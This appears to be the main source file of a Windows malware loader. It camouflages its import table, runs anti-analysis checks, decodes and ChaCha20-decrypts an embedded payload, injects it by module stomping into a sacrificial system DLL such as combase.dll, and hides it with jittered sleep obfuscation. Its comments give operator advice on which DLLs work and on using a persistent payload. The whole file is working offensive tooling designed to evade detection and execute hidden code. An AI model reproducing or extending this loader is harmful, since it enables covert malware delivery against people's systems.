// Main.c
#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"
#include "IatCamouflage.h"
#include "ChaCha.h"
#include "RawData.h"

/*=========================================
@ Sacrificial Dll Path & Global Win32Api
===========================================*/

/*
	NOTE:
	Due to the nature of Module Stomping technique used in this loader,
	some System32 DLLs may not work because of section alignment or
	entry point location issues.

	✅ Currently tested and working recommended DLLs:
		 - ole32.dll
		 - winhttp.dll
		 - combase.dll

	It is strongly recommended to use one of these three DLLs.
*/
#define SACRIFICIAL_DLL_PATH L"C:\\Windows\\System32\\combase.dll"

// Global WIN32_API variable
WIN32_API g_Win32 = { 0 };

/*=========================================
@ Main Function
===========================================*/
INT main() {
	
	PBYTE					EncryptedBuffer			= (PBYTE)EncodedText;
	SIZE_T					EncryptedSize			= sizeof(EncodedText);
	PBYTE					DecodedBuffer			= { 0 };
	SIZE_T					DecodedSize			= { 0 };
	ULONG					JitteredTimeout			= 20000 + (Random32() % 14000);

	// Initialize Win32 APIs
	if (!InitializeWin32Apis(&g_Win32)) {
		return -1;
	}

//--------------------------------------------

	// Perform IAT camouflage
#ifdef DEBUG
	DBGPRINT("[*] Executing IAT Camouflage \n");
#endif
	IatCamouflage();
#ifdef DEBUG
	DBGPRINT("[+] Success \n");
#endif

//--------------------------------------------
	
	// Perform Anti-Analysis check
#ifdef DEBUG
	DBGPRINT("[*] Performing Anti-Analysis Checks \n");
#endif
	PerformAntiAnalysisCheck();

//--------------------------------------------

	// Decode the payload
#ifdef DEBUG
	DBGPRINT("[*] Decoding The Payload \n");
#endif
	BaseNDecode(EncryptedBuffer, EncryptedSize, &DecodedBuffer, &DecodedSize);
#ifdef DEBUG
	DBGPRINT("[+] Success \n");
#endif

	// Decrypt the payload
#ifdef DEBUG
	DBGPRINT("[*] Decrypting The Payload \n");
#endif
	if (!ChaCha20Decrypt(DecodedBuffer, DecodedSize, ChaCha20Key, ChaCha20Iv)) {
#ifdef DEBUG
		DBGPRINT("[-] Failed To Decrypt Payload - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return -2;
	}
#ifdef DEBUG
	DBGPRINT("[+] Success \n");
#endif

//--------------------------------------------
	
	// Inject the payload
#ifdef DEBUG
	DBGPRINT("[*] Injecting the payload into -> [%ws] \n", SACRIFICIAL_DLL_PATH);
#endif
	StompTheModule(SACRIFICIAL_DLL_PATH, DecodedBuffer, DecodedSize);
#ifdef DEBUG
	DBGPRINT("[+] Success \n");
#endif 

//--------------------------------------------

	/* 
	   Zilean Sleep Obfuscation - If used with a 'calc' payload, it will not function properly
	   Please use a more persistent payload, as 'calc' terminates the execution thread immediately upon completion \
	*/
	while (TRUE) {
		ZileanSleep(JitteredTimeout);
	}

	return 0;
}
